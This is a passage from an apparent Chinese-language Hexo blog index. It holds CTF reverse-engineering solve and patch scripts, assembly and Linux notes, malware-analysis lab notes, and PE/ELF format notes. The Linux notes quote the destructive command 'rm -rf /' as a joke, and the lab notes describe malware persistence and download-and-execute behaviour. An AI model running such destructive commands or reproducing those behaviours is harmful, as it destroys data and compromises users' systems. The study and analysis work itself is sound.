ans=&#39;juhuhfenlapsiuerhjifdunu&#39;;s=[];s1=[] #之前爆破脚本得到的字符串 #建立一个对应字典，这里就是因为直接用数组没法经过px_re，只能用字符串，所以我们可以用字典来替代 for i in range(len(ans)//4): s.append(ans[i*4:i*4+4]) for i in range(len(ans)//4): s1.append(chr(ord(&#39;a&#39;)+i)) dic_arr=dict(zip(s1,s)) #print(dic_arr) #此题产生v11加密算法 def code(s): res=0 for i in range(len(s)): res^=(ord(s[i])+i) return res cons1=code(ans) #print(cons1) px_arr=px_re(&#39;abcdef&#39;) #创建序列到px_arr res_arr=[] for i in range(len(px_arr)): tmp=&quot;&quot; for j in range(6): tmp+=dic_arr[px_arr[i][j]] res_arr.append(tmp) #print(res_arr) dic=[254 ,233 ,244 ,226 ,241 ,250 ,244 ,228 ,240 ,231 ,228 ,229 ,227 ,242 ,245 ,239 ,232 ,255 ,246 ,244 ,253 ,180 ,165 ,178] #题目的字典建立 #print(res_arr) #下面为最终爆破flag算法 for i in range(len(res_arr)): res=&quot;&quot; for j in range(len(res_arr[i])): res+=chr(ord(res_arr[i][j])^dic[j]^cons1) print(res,res_arr[i],hex(cons1)) 结果：","categories":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}]},{"title":"poc脚本研究报告","slug":"cve/poc脚本研究报告","date":"2020-03-10T03:32:28.000Z","updated":"2020-03-17T08:12:49.216Z","comments":true,"path":"2020/03/10/cve/poc脚本研究报告/","link":"","permalink":"/2020/03/10/cve/poc脚本研究报告/","excerpt":"","text":"和hr作了约定一个星期学习POC脚本，这里放到博客里来进行记录，个人理解POC脚本实际上也是漏洞的复现，正好最近自己的移动安全作业要复现一个cve漏洞，所以就直接把他们联系到一起吧。 概念名称：POC全称：Proof of Concept（观点验证程序）安全范围：漏洞复现，实现成功利用的脚本","categories":[{"name":"漏洞","slug":"漏洞","permalink":"/categories/漏洞/"}],"tags":[],"keywords":[{"name":"漏洞","slug":"漏洞","permalink":"/categories/漏洞/"}]},{"title":"抗疫赛ctf","slug":"ctf/抗疫比赛","date":"2020-03-10T03:30:38.000Z","updated":"2020-03-26T13:19:15.895Z","comments":true,"path":"2020/03/10/ctf/抗疫比赛/","link":"","permalink":"/2020/03/10/ctf/抗疫比赛/","excerpt":"","text":"这次比赛的质量挺高的，除了那个出错了的fxck，昨天纠结了一下午，后来程序更新也没通知，我是真的想日穿出题者难受，还有一个线性移位寄存器的题，后面我就等着wp自己再去复现一下，那一个我是真的没想出来 #天津垓 扔到ida里面分析，这里是第一个关键函数，按照他的指令就是把我们输入的值和Rising_Hopper!字符串做与和或的操作得出来的值和下面的值比对逆出字符串Caucasus@s_ability，显然不是flag在观察函数时，发现第二个关键函数对一大批数据进行了异或处理，异或字符串就是我们刚逆出来的Caucasus@s_ability，然后output脚本（这里可以直接ida复刻，但是也放出python的方法） ttt=&quot;Caucasus@s_ability&quot; f=open(&quot;ppp&quot;,&quot;rb&quot;) f1=open(&quot;flag&quot;,&quot;wb&quot;) p=1;i=0;p1=1 while(p1): p1=f.read(1) p=int.from_bytes(p1,byteorder=&#39;big&#39;,signed=False) if(i&gt;=0xc4d and i&lt;=0xc4d+0x41e): n = p ^ ord(ttt[(i - 0xc4d) % 18]) f1.write(n.to_bytes(length=1,byteorder=&#39;big&#39;,signed=False)) else: f1.write(bytes(p1)) i += 1 然后key2就出来了，比对函数，最后按照逻辑逆出来就行，就一个计算逻辑脚本： res=[0x1EA272,0x206FC4,0x1D2203,2027349,2421009,1653372,2047032,2184813,2302911,2263545,1909251,2165130,1968300,2243862,2066715,2322594,1987983,2243862,1869885,2066715,2263545,1869885,964467,944784,944784,944784,728271,1869885,2263545,2283228,2243862,2184813,2165130,2027349,1987983,2243862,1869885,2283228,2047032,1909251,2165130,1869885,2401326,1987983,2243862,2184813,885735,2184813,2165130,1987983,2460375] for i in range(len(res)): print(chr(res[i]//0x4ce3),end=&#39;&#39;) 得到flag 后来还遇到了一个base58出错的题，自闭了一个下午，难受，不过后来发现自己的base58脚本写的有些问题，也算是有一小点点的补偿吧。。还有一个虚拟机的，这里就不说了，就是麻烦，其实逻辑很简单。然后等我更新那个寄存器吧 gatesXgame放上官方wp：null指针放上我的朋友的wp：高高有话说 这道题的答题思路就是一个去花，然后走迷宫，其中新颖的点就是每走一步就换更换系统框架，在x86和64之间轮换跳转，这里我就直接搬来官方wp给的两个花结构 #define JUNK2(idx) __asm{ \\ __asm call next1_junk2_##idx \\ __asm __emit 0x77 \\ __asm jmp next_junk2_##idx \\ __asm __emit 0x88 \\ __asm next1_junk2_##idx: \\ __asm add dword ptr ss:[esp], 1 \\ __asm ret \\ __asm next_junk2_##idx: \\ } #define JUNK1(idx) __asm{\\ __asm jmp jlabel##idx \\ __asm __emit 0x88 \\ __asm jlabel_##idx : \\ __asm ret \\ __asm __emit 0xba \\ __asm jlabel##idx : \\ __asm call jlabel_##idx \\ } 可以自己慢慢去patch，然后我自己写了一个通用的patch脚本，以后只要遇到是有结构性的花指令，都可以用这个脚本来patch，刚patch出来的时候我的心情是无比激动的，呃啊啊啊啊啊！总算patch成了！下面是脚本 h1=[0xEB,0x03,0x88,0xC3,0xBA,0xE8,0xF9,0xFF,0xFF,0xFF] #花结构 h2=[0xE8,0x04,0x00,0x00,0x00,0x77,0xEB,0x07,0x88,0x36,0x83,0x04,0x24,0x01,0xC3] data=[] def check(i,rep): #负责数组匹配和patch k=1 while(k&lt;len(rep)): #这里匹配不同就退出来 if data[i+k]!=rep[k]: return 0 k+=1 for j in range(len(rep)): #匹配成功之后这里进行patch data[i+j]=0x90 with open(&quot;123.exe&quot;,&quot;rb&quot;) as f: #打开文件变成数组data a=f.read(1) while(a): data.append(int.from_bytes(a,byteorder=&#39;little&#39;,signed=False)) a=f.read(1) for i in range(len(data)): #进行匹配 if(data[i]==h1[0]): check(i,h1) elif(data[i]==h2[0]): check(i,h2) with open(&quot;1&quot;,&quot;wb&quot;) as fw: #写入 for i in data: fw.write(i.to_bytes(1,byteorder=&#39;little&#39;,signed=False)) 前后效果图未patchpatch后","categories":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}]},{"title":"汇编大学习","slug":"re/汇编学习-逆向","date":"2020-03-03T07:26:57.000Z","updated":"2020-03-03T07:26:59.869Z","comments":true,"path":"2020/03/03/re/汇编学习-逆向/","link":"","permalink":"/2020/03/03/re/汇编学习-逆向/","excerpt":"","text":"汇编的基础不能一蹴而就，一步一步在实践中学习得来的，只有这样知识才能稳定的进到脑子里，在用的时候不会出现短路的情况。（emmmmmmmm，断路更合适一点_ (:з」∠) _） 这里就没有顺序的讲述了，有什么就记什么了，添加个索引到时候自己就可以分类了 函数约定cdecl流程： push参数 call memory_location 调用函数，push EIP，保存当前指令地址，然后修改EIP为指定函数地址 push EBP，保存当前栈底 函数工作（ps：开始头部一般都是，esp=ebp，esp-=xxx） pop EBP pop EIP并跳转（ps：这里相当于ret） 调整之前栈里面保持的参数 流程图如下： 其余约定等待更新，预计三天后 常用指令说明（很常见的不提，这里只提一些关键但不是很普遍的，或者不容易懂得）cmp指令 &amp;&amp; test指令 &amp;&amp; 跳转指令cmp：通过比较两个寄存器设置标志位| cmp dst,src | ZF | CF ||:————–:| :: | :: ||dst=src(重要) | 1 | 0 ||dstsrc | 0 | 0 |所以if(!cmp)是判断字符串是否相同 test：相当于and（一般看ZF） jz，jnz：ZF=1跳；ZF=0跳 ======= je，jnejg，jge：dst&gt;src\\目标操作数大于源操作数\\CF==0跳；jge为大于等于jl，jle：dst&gt;src\\目标操作数小于源操作数\\CF==0跳；jge为小于等于 mul &amp;&amp; div乘除不说，说一下结果保存点，EAX与EDXmul：EAX保存低32位、EDX保存高32位div：EAX保存商、EDX保存余数 格式： mul value；div value； 缓冲区操作指令 &amp;&amp; 重复指令movsx、cmpsx、stosx、scasx（x代表字节大小，可分为b,w,d,q）（这些操作只在EDI、ESI里面执行） movsx：从[ESI]取出字节，交到[EDI]，然后根据DF标志加1或减1（DF=0，+）\\（DF=1，-1）cmpsx：比对[ESI],[EDI]中的字节stosx：将指定字节存入[EDI]scasb：从一串字节中搜索一个值，该值由AL给出，存到[EDI]rep重复指令停止条件rep：ECX为0时循环终止repe、repz：ECX为0 or ZF=0 时循环终止（字符串是否相同）repne、repnz：ECX为0 or ZF=1 时循环终止 组合： rep movsx ：[EDI]=[ESI] 直到ECX=0；———-memcpyrepe cmpsx ：判断？[EDI+i]==[ESI+i] 直到ECX=0 or ≠；———-memcmprepne scasx ：从缓冲区中搜索一个字节 直到ECX=0 or = \\有便存入rep stosx：给定初始值赋给一段缓冲区，[EDI]指向缓冲区地址，AL包含初始值；———-memset","categories":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}]},{"title":"","slug":"基础/Frida工具的学习","date":"2020-02-26T03:03:47.631Z","updated":"2020-04-01T03:46:45.150Z","comments":true,"path":"2020/02/26/基础/Frida工具的学习/","link":"","permalink":"/2020/02/26/基础/Frida工具的学习/","excerpt":"","text":"title: Frida工具的学习author: 蝉3301avatar: https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/GhostSoul.icoauthorLink: shijingtian.github.ioauthorAbout: 一个好奇的人authorDesc: 一个好奇的人categories: 逆向date: 2/26/2020 11:05:13 AMcomments: truetags:keywords:description: Frida工具的学习photos: https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png 先留着，感觉是一个神器，不过还是尽量懂得原理，不要做脚本小子","categories":[],"tags":[],"keywords":[]},{"title":"linux学习","slug":"基础/linux学习","date":"2020-02-21T01:57:23.000Z","updated":"2020-04-01T03:45:56.018Z","comments":true,"path":"2020/02/21/基础/linux学习/","link":"","permalink":"/2020/02/21/基础/linux学习/","excerpt":"","text":"常用指令ls-a 显示所有文件包括隐藏文件 -l 显示详细信息 -d 查看目录属性 -h 人性化显示文件大小 -i 显示文件名和inode 图片中有一个错误，分组后面还有一个文件大小 目录//cd cd ~ 回家 cd - 回退，去之前去过的一个目录 cd / 进入根目录，比家更彻底 cd .. 回上一个目录 pwd 显示目录路径 //mkdir 新建文件 -p 可以多层建立 //rmdir 删除空目录（必须是空目录） -p 删除子目录如果上一级目录变空则上一级删除 //rm （常用） -r 删除整个目录 -f force强制删除，不用确认 -i 删除前逐一询问 rm -rf / 删光电脑程序（linux从入门到跑路的关键代码） 文件处理//cp 同mv -a 相当于dpr -d 如果是链接文件，复制链接属性 -f 覆盖已存在不给提示 -i 覆盖给提示 -p 额外把修改时间和访问权限复制到文件 -r 目录文件的话，就全都复制 -l 不复制文件，只生成链接 //mv mv [参数] [源文件] [目标文件] -i 询问覆盖 -f 不询问覆盖 //ln 同mv -b 删除覆盖以前的链接 -d 允许超级用户制作目录的硬链接，一般用户建立文件的硬链接 -f 不询问执行 -i 询问执行 -n 符号链接视为一般目录 -s 软连接（符号链接） -v 显示处理过程 linux文件组成 用户数据：用户所有的源数据元数据：包含inode的文件附加数据 软连接与硬链接硬链接：一个inode号对应多个文件名，这些文件为硬链接，一个文件有多个别名 特性： 文件有相同的inode以及data block 只能对已存在文件创建 不能交叉文件系统进行硬链接创建 不可创建目录文件 删除单一不影响其他 软连接：用户数据块存放的内容是另一个文件的路径名指向（windos快捷方式） 特性： 有自己的文件权限与属性 可以对不存在文件创建 可以交叉系统创建 可创建目录文件 创建，i_nlink不增加 删除不影响被指向文件 搜索locate：文件搜索命令 locate [参数] 文件名 -d 指定搜索数据库（默认/var/lib/mlocate.db）（如果数据库没更新，就搜不到新建，更新命令updatedb，较慢） whereis：搜索命令 -b 搜索二进制文件-m 搜索man手册-s 只搜索源代码-f 终止&lt;目录&gt;参数列表-u 搜索不常见记录-l 输出有效查找路径 which：区别于whereis：which可看到文件别名（Ubuntu好像没区别。。） ps：外部命令有使用手册例如ls\\apt（man），内部命令没有例如cd find find [搜索路径] [选型] [文件名]（find / -name install.org） 通配符模糊搜索（*匹配任意数量字符、？匹配一个字符、[]匹配一个中数组内的字符） [选型]-iname：忽略大小写-user：按所有者-root：按无所有者-mtime：几天内修改过的文件、-atime、-ctime-size：文件大小（-size +20k -a -size -50k）-inum：索引号-a -o：逻辑与逻辑或-exec：以;结束，防止歧义一般用”\\;” grep文件中匹配符合字符串 grep [选项] 字符串 文件名 [选项]-i：忽略大小写-v：排除指定字符串-l：列出包含匹配字符串的文件 帮助命令 –help（或 man 例：man ls） 压缩解压缩.gz gzip 源文件-c：保留源文件-r：目录包含文件都压缩-d：解压缩 .bz2 bzip2 源文件-k：保留原文件-d：解压缩 .tar tar [选项]tar -cvf xorr.tar xorr 关机与重启shutdown [选项] 时间-c 取消关机操作-h 关机后停机-r 重启（设置了时间在控制台就被挂起了） halt、poweroff、init 0 cat /etc/inittab 系统启动的默认级别runlevel 显示现在系统的级别logout 退出当前用户 这里有点乱，到时候稍微在整理一下编程###vi","categories":[{"name":"基础技术","slug":"基础技术","permalink":"/categories/基础技术/"}],"tags":[],"keywords":[{"name":"基础技术","slug":"基础技术","permalink":"/categories/基础技术/"}]},{"title":"恶意代码分析-lab-3-4-5","slug":"virus/恶意代码分析-lab3-4-5","date":"2020-02-15T03:26:54.000Z","updated":"2020-03-04T10:42:11.904Z","comments":true,"path":"2020/02/15/virus/恶意代码分析-lab3-4-5/","link":"","permalink":"/2020/02/15/virus/恶意代码分析-lab3-4-5/","excerpt":"","text":"这次把实验3-4-5写到一起，感觉这样更好看一些 []~(￣▽￣)~* lab3-1分析首先，加壳，由于这一章是动态分析，所以不脱壳直接动态分析 通过procmon可以得到一些库出去基础，额外有ntdll.dll、wow64.dll 字符串中有如下图 可能修改了注册表使其可以开机自动运行，并且运行了一个vmx32to64.exe的程序 不过这个文件应该是挂了，我的win7系统上运行不起来，毕竟这本书是在xp的基础上讲得，不过我发现如果用ida可以直接判断出很多有用的信息 一些知识： HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run procmon筛选会出现的典型噪声（原理：随机数发生器的种子会有软件在注册表上不断更新） HKML\\SOFTWARE\\Microsoft\\Cryptography\\RNG\\Seed 之后换了在xp机上实验，果然是版本问题，看来病毒太老也是不行 0-0 procmon选出筛选条件 得到相关数据 这里可以得出上述中的vmx32to64.exe写进了system32的文件里，seed是噪声，第二项表明建立了一个开机启动项 procex可以观察正在运行中的lab03-1.exe的一些信息 导入的一些dll文件 ws2_32.dll: Windows Sockets应用程序接口， 用于支持Internet和网络应用程序。 //一般就是允许恶意软件联网（还有wshtcpip.dll）建立了一个互斥量WinVMX32（互斥量：同一时间保证只有一个恶意代码在运行） 同时在注册表设置了开机自启动 第一个实例就是练习试用一下各个工具 3-2样本名称：Lab03-02.dll样本大小：24065bytes样本类型：DLL 32bit Portable executable for 80386 (PE)MD5：84882C9D43E23D63B82004FAE74EBB61 分析环境：Windows7 64虚拟机调试工具：PE_Stu、IDA 直接一个dll文件，之前说过可以用rundll32.dll直接运行一下，刚开始踩坑了，应该先去查看他的输出表，之后再去根据输出表的函数输入对应的cmd命令 cmd命令: rundll32.exe Lab03-02.dll,installA 看到ServcieMain说明恶意代码要安装一个服务 查看import库 CreateServiceA,RegSetValueExA等（ADVAPI32.dll）表明里面有服务操作,且有注册表值修改WS2_32.dll：联网，其中有关于http的相关函数说明使用了http","categories":[{"name":"virus","slug":"virus","permalink":"/categories/virus/"}],"tags":[],"keywords":[{"name":"virus","slug":"virus","permalink":"/categories/virus/"}]},{"title":"PE——ELF文件格式","slug":"re/PE-ELF文件结构","date":"2020-02-14T03:03:00.000Z","updated":"2020-03-03T07:35:41.479Z","comments":true,"path":"2020/02/14/re/PE-ELF文件结构/","link":"","permalink":"/2020/02/14/re/PE-ELF文件结构/","excerpt":"","text":"之前老师给了任务，同时自己也学习了很多，所以在这里写一下关于ELF和PE的文件格式的一些学习 ELF文件格式先写出readelf和hexdump的一些用法 readelf： -a 全部展现 -h ELF文件头 -l 程序头 -S 节区头（注意大写） -x index 节区中每个分区的十六进制 hexdump: -s 从某个地址开始（可以用0x） -n 截取大小 -C 标准十六进制格式输出 首先观察一下特德文件大体结构，如下图，左边是在磁盘中的结构，右图是运行时的结构，磁盘中分的节区，运行中的分的是段 接下来介绍一下刚才图中的三个索引表 ELF头部(ELF_Header): 每个ELF文件都必须存在一个ELF_Header,这里存放了很多重要的信息用来描述整个文件的组织,如: 版本信息,入口信息,偏移信息等。程序执行也必须依靠其提供的信息。 程序头部表(Program_Header_Table): 可选的一个表，用于告诉系统如何在内存中创建映像,在图中也可以看出来,有程序头部表才有段,有段就必须有程序头部表。其中存放各个段的基本信息(包括地址指针)。 节区头部表(Section_Header_Table): 类似与Program_Header_Table,但与其相对应的是节区(Section)。 ELF 头部：设置一个elf文件常用的数据格式（此为32位） //ELF Header结构体 #define EI_NIDENT 16 typedef struct { unsigned char e_ident[EI_NIDENT]; 一个数组含有magic，大小端绪、32\\64位，文件版本、ABI等信息 ELF32_Half e_type; 文件类型：可重定向（.O）、可执行、共享目标文件（.so） ELF32_Half e_machine; cpu架构 ELF32_Word e_version; 文件版本 ELF32__Addr e_entry; 代码入口地址 ELF32_Off e_phoff; 程序头偏移（==ELF头size） ELF32_Off e_shoff; 节区头偏移 ELF32_Word e_flags; 暂无0 -0 ELF32_Half e_ehsize; ELF头size ELF32_Half e_phentsize; 程序头各分段size ELF32_Half e_phnum; 程序头中分段数量 ELF32_Half e_shentsize; 节区头各节区size ELF32_Half e_shnum; 节区头节区数量 ELF32_Half e_shstrndx; 节区名称于节区数组中的下标 }Elf32_Ehdr; 下图为ida与linux中readelf图 hex表 其中Relocatable File（.o文件）不需要执行，因此e_entry字段为0，且没有Program Header Table等执行视图 程序头部表： //每个段的结构 typedef struct{ Elf32_Word p_type; 下文有介绍 Elf32_Off p_offset; 段相对于文件的索引地址 Elf32_Addr p_vaddr; 段在内存中的虚拟地址 Elf32_Addr p_paddr; 段的物理地址 Elf32_Word p_filesz; 段在文件中的size Elf32_Word p_memsz; 段在内存中的size Elf32_Word p_flage; 段相关标志(read、write、exec) Elf32_Word p_align; 字节对齐 p_vaddr 和 p_offset 对 p_align 取模后应该等于0。 } Elf32_phdr; p_type 声明此段的作用类型 PT_INTERP:共享库的加载器执行外部库搜索和加载的程序称为加载器，elf格式的是ld-linux.so，a.out格式是ld.so。而由于加载器可能有多种实现，也可能有多个版本，所以每个二进制文件中都需要指明使用哪个加载器，指明使用哪个加载器的功能就是用segment实现的，这种segment就是PT_INTERP类型。 PT_DYNAMIC：记录了elf执行需要的库 PT_LOAD：真正的程序存储的地方。这个构成了程序的主体。 此段文字摘抄于broler作者的csdn博客，一下为其链接 https://blog.csdn.net/ljy1988123/article/details/50404642 以下为ida与readelf读出的程序头部表以及hex图 节区头部表//每个节区的结构 typedef struct{ Elf32_Word sh_name; 节区名称 Elf32_Word sh_type; 节区格式 Elf32_Word sh_flags; 节区相关标志(read、write、exec) Elf32_Addr sh_addr; 地址 Elf32_Off sh_offset; 偏移 Elf32_Word sh_size; 大小 Elf32_Word sh_link; 给出此节区需要用到的索引成员链接（比如.dynsym---&gt;.dynstr） Elf32_Word sh_info; 此成员给出的一些附加信息（与type有关） Elf32_Word sh_addralign; 字节对齐 Elf32_Word sh_entsize; 节区中每条ent的size（若节区里面又分成了多条ent） }Elf32_Shdr; sh_type 系统节区的功能属性 动态连接过程所需要的信息由.dynsym、.dynstr、.interp、.hash、.dynamic、.rel、.rela、.got、.plt 等节提供 .init 和.fini 节用于进程的初始化和终止过程。 以点号”.”为前缀的节名字是为系统保留的 节区功能属性及下面文字摘抄于广敏作者的csdn博客，以下为其链接地址 https://blog.csdn.net/u011298001/article/details/84862565 以下为readelf读出的节区头部表和section到segment的映射表 elf中重要的功能重定位 这里给重定位留着位置，现在总是半懂不懂的，先留着等过以后找时间补充 其上内容借鉴于各大佬的博客，以下附上链接地址 https://blog.csdn.net/u011298001/article/details/84862565https://blog.csdn.net/ljy1988123/article/details/50404642https://www.52pojie.cn/thread-591986-1-1.html PE文件格式个人感觉PE文件结构看上去比ELF要友好那么一点点（可能是因为做windows恶意代码分析的缘故吧0 -0） 废话不多说，先上一个PE文件结构的图 此图为逆向工程核心原理上的结构图左边是磁盘上的结构右边是运行时映射到内存上的结构 首先还是从“头”开始 PE文件头dos头（含dos存根）比较简单，这里就不列出全部了，我们只需要关注两个区域，图片在下面，在下一个是在PE_stu里面展示的，大致了解一下情况 e_magic：常数，文本值为MZe_lfanew：NT头的偏移又或者说是dos头的大小 这里他的dos存根就是展示一下DOS操作系统不能运行，然后退出这个程序，算是一个小小的彩蛋吧，哈哈 NT头这个头就比较重要了，他由两部分组成，一个是文件头一个是可选头，NT头是头里面最大的头 typedef struct _IMAGE_NT_HEADERS { DWORD Signature; 签名PE IMAGE_FILE_HEADER FileHeader; 文件头 IMAGE_OPTIONAL_HEADER32 OptionalHeader; 可选头 } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 文件头 typedef struct _IMAGE_FILE_HEADER { WORD Machine; 文件运行的平台，比如x86，x86_64 WORD NumberOfSections; 节区数目 DWORD TimeDateStamp; 时间戳，换算可以参考病毒分析的lab1 DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; 可选头大小 WORD Characteristics; 文件的属性 } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; Machine Characteristics 这里我们只需要记住一些重要的就行比如0x0002（可执行）、0x0100（32位）、0x1000（系统文件）、0x2000（dll文件） 图片来源于adam001521的博客 可选头 typedef struct _IMAGE_OPTIONAL_HEADER { WORD Magic; 表明可选头类型（0x10b 32PE、0x20b 64PE） BYTE MajorLinkerVersion; 链接器的版本号 BYTE MinorLinkerVersion; DWORD SizeOfCode; 代码段的总长度 DWORD SizeOfInitializedData; 初始化数据长度 DWORD SizeOfUninitializedData; 未初始化数据长度 DWORD AddressOfEntryPoint; 程序入口RVA exe的main、dll的DllMain、驱动的DriverEntry DWORD BaseOfCode; 代码段起始的RVA DWORD BaseOfData; 数据段起始的RVA DWORD ImageBase; 映像（加载到内存上的）基地址 DWORD SectionAlignment; 内存中节区地址起始最小值，比如0x1000则每个节的起始地址低12位都是0 DWORD FileAlignment; 文件中对齐值，同上文 WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; 保留必须为0 DWORD SizeOfImage; 映射到内存的映像的大小 DWORD SizeOfHeaders; 头的大小，以FileAlignment对齐的 DWORD CheckSum; WORD Subsystem; 区分是系统文件还是可执行文件 WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; 数据目录数目，下面的数据目录是个数组，里面存着各种重要的数据的RVA和Size IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; Subsystem 值 含 义 备 注 1 Driver文件 系统驱动（如：ntfs.sys） 2 GUI文件 窗口应用程序（如：notepad.exe） 3 CUI文件 cmd程序（如：cmd.exe） DataDirectory（结构就不放了，就一个RVA一个size） 重要的是import[1]、export[0]、resource[2]、TLS[9] 最后说明一下其十六进制数据 节区头typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; 节表名称,如“.text” union { DWORD PhysicalAddress; 磁盘中的地址（物理地址） DWORD VirtualSize; 虚拟大小（节区映像大小） }Misc; DWORD VirtualAddress; 虚拟地址 DWORD SizeOfRawData; 磁盘中节区大小 DWORD PointerToRawData; 磁盘中节区偏移 DWORD PointerToRelocations; 在OBJ文件中使用，重定位的偏移 DWORD PointerToLinenumbers; 行号表的偏移（供调试使用地） WORD NumberOfRelocations; 在OBJ文件中使用，重定位项数目 WORD NumberOfLinenumbers; 行号表中行号的数目 DWORD Characteristics; 节属性如可读，可写，可执行等 } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; Characteristics 图片来源于qintangtao的博客园 十六进制图 import导入export导出重定位延迟重定位loading。。。。。。 感谢adam001521师傅提供的素材qintangtao师傅提供的图片","categories":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"/categories/逆向/"}]},{"title":"恶意代码分析-lab1","slug":"virus/恶意代码分析-lab1","date":"2020-02-13T03:03:00.000Z","updated":"2020-03-04T10:42:17.639Z","comments":true,"path":"2020/02/13/virus/恶意代码分析-lab1/","link":"","permalink":"/2020/02/13/virus/恶意代码分析-lab1/","excerpt":"","text":"之前学了PE结构，dll注入以及一些相关的逆向知识后，正式开始恶意代码分析的学习，先从这本恶意代码分析开始，争取一个星期把它消化完。 lab1-1virustotal.com可以直接上传文件查看分析报告，会对比其中相关的哈希值，查找库是否此文件有问题第一章的问题稍微都简单一些，这里就简单带过分析：有病毒特征，特征如下从PE-stu查看文件可知，时间戳的二进制是0x4d0e2fd3然后就是转换成时间的过程，这里应该有更简单的方法，但是我想学习并练习一下C++的使用，所以写了一个程序 #include &lt;stdio.h&gt; #include &lt;ctime&gt; using namespace std; void unix2time(int n, char strTime[], int buflen) { struct tm tm = *localtime((time_t *)&amp;n); //这里的定义不太清楚，我傻了 strftime(strTime, buflen-1, &quot;%Y-%m-%d %H:%M:%S&quot;, &amp;tm); strTime[buflen-1] = &#39;\\0&#39;; } int main(void) { int n; char strTime[100]={0}; scanf(&quot;%p&quot;,&amp;n); //输入十六进制，记住p，记住是&amp;n不是n unix2time(n,strTime,sizeof(strTime)); printf(&quot;%s&quot;, strTime); } exe时间：2010-12-20 00:16:19dll时间：2010-12-20 00:16:38有效字符串过少，但import库里面的函数数目正常，查找字符串也是正常，exe程序应该是未混淆未加壳copy find creat file可以看出创建并查找了某个文件，可能是进行了电脑上系统文件的替换中毒情况是屏幕背景变黑，应该是改变屏幕程序的文件了 dll文件里有CreateProcess和Sleep，同时import导入了WS2_32.dll的库的一些函数，其中一些函数提供了联网的功能 从dll文件中可以看到一个ip地址，以为是教学使用所以是具体的，真正恶意代码一般是路由的公网ip 文件目的：dll是一个后门，exe用来安装运行dll文件的 其中exec与sleep结合使用，需要特别关注，可能是通过网络给后门程序传达命令的 ##lab1-2分析：有病毒特征，加upx壳，尝试脱壳，esp定律，走到ep，dump出来就行 查看导入函数：StartServiceCtrlDispatcherA、CreateServiceA、OpenSCManagerA（advapi32.dll） StartServiceCtrlDispatcherA：将服务进程的主线程连接到服务控制管理器，这使得线程成为调用进程的服务控制调度程序线程。 CreateThread（kernal.dll） InternetOpenUrlA（wininet.dll） 访问相关网络资源 总结：创建一个线程，创建新的服务并控制 ##lab1-3分析：有病毒特征，加了壳，是FSG壳，但是看开头三个地址就知道那是最终的目标，然后f8下去找到的入口，参考图如下 有两个新库oleaut32.dll、ole32 CoCreateInstance（ole32）SysAllocString（oleaut32.dll） 最终感染就是打开一个网站http://www.malwareanalysisbook.com/ad.html ##lab1-4分析：有病毒特征，无壳未混淆，输入库结构清晰 有create、movefile之类的函数，还有openprocess，loadresource的函数 GetWindowsDirectoryA：得到系统文件目录 通过分析好像是修改了一个wupdmgr的程序，网络查阅发现是windows更新的程序（可删除），但是有病毒伪造的可能，所以确定了，新建了wupdmgr文件，植入病毒 这里书本给了提示，通过resource hacker可以发现此文件在PE文件里藏了一个可执行exe程序 将exe程序dump出来之后可以发现 __imp_URLDownloadToFileA、WinExec远程下载程序并执行，就此初步目的分析结束 lab1的练习结束，发现答案解析比我想象的要简单，需要加快速度，奥利给！！","categories":[{"name":"virus","slug":"virus","permalink":"/categories/virus/"}],"tags":[],"keywords":[{"name":"virus","slug":"virus","permalink":"/categories/virus/"}]},{"title":"博客搭建自学注意事项","slug":"基础/博客搭建自学注意事项","date":"2020-01-29T11:45:40.000Z","updated":"2020-04-01T03:46:54.072Z","comments":true,"path":"2020/01/29/基础/博客搭建自学注意事项/","link":"","permalink":"/2020/01/29/基础/博客搭建自学注意事项/","excerpt":"","text":"大体操作在\\hexo的_config.yml里面有 description: 好少年光芒万丈 keywords: author: 蝉3301 language: zh-cn timezone: #这里注意deploy和backup的格式即可 deploy: type: git repo: github: git@github.com:shijingtian/shijingtian.github.io.git # github: https://github.com/honjun/honjun.github.io.git # coding: https://git.coding.net/hojun/hojun.git branch: master # backup backup: type: git message: backup my blog of https://shijingtian.github.io/ repository: github: https://github.com/honjun/honjun.github.io.git/tree/back #coding: https://git.coding.net/hojun/hojun.git,backup 在\\themes的_config.yml里面有 # site name prefixName: 阿天 siteName: 蝉3301 # favicon and site master avatar favicon: /images/GhostSoul.ico avatar: /img/custom/avatar.jpg url: https://shijingtian.github.io description: T R Y cdn: https://cdn.jsdelivr.net/gh/shijingtian/cdn@master pjax: 1 notice: PE结构研读中(IAT、EAT) lazyloadImg: https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg 这里要哪个就用哪个就行，想要增加后面的zh-cn文件里面添加一下就行，后面背景什么的都一样不再赘余 menus: 首页: { path: /, fa: fa-fort-awesome faa-shake } 归档: { path: /archives, fa: fa-archive faa-shake, submenus: { 技术: {path: /categories/技术/, fa: fa-code }, # 生活: {path: /categories/生活/, fa: fa-file-text-o }, # 资源: {path: /categories/资源/, fa: fa-cloud-download }, # 随想: {path: 